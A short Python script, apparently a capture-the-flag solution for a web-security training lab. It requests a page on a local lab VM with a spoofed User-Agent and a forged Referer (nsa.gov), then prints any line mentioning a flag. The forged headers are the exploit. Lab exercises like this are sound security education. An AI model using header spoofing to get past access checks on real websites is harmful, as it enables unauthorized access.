import requests

url = 'http://192.168.56.101/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c'

def change_header():
    headers = {
        'User-Agent' : 'ft_bornToSec',
        'Referer' : 'https://www.nsa.gov/'
    }
    r = requests.get(url, headers=headers)
    file = open("./page.html", "w+")
    file.writelines(r.text)
    file.close()
    for line in r.text.splitlines():
        if line.lower().find('flag') != -1:
            print("Success !! we have a flag : ")
            print(line)

if __name__ == "__main__":
    change_header()